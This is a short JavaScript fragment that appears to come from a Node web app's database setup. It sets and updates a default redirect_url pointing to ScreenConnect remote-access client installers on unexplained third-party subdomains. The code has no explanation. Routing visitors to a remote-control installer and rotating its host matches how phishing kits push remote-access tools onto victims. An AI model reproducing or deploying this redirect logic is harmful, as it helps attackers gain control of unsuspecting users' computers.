...
if (!initialSettings) {
  ...
  `).run(
    ...
    "https://professionalgfx1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
  );
}

// Update existing settings if they are still using the old default
db.prepare(`
  UPDATE settings 
  SET redirect_url = ? 
  WHERE id = 1 AND redirect_url = 'https://almarabeaunited2.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
`).run("https://professionalgfx1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest");
